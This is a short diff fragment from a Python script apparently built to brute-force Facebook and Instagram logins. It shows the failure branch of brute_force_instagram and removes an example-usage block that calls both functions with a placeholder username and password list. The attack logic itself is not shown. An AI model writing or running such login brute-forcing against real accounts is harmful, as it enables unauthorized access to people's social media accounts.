@@ -64,10 +64,3 @@ def brute_force_instagram(username, password_list):
     
     print("Brute force attack failed.")
     return False
-
-# Example usage
-username = "example_user"
-password_list = ["password1", "password2", "password3"]  # Add more passwords as needed
-
-brute_force_facebook(username, password_list)
-brute_force_instagram(username, password_list)
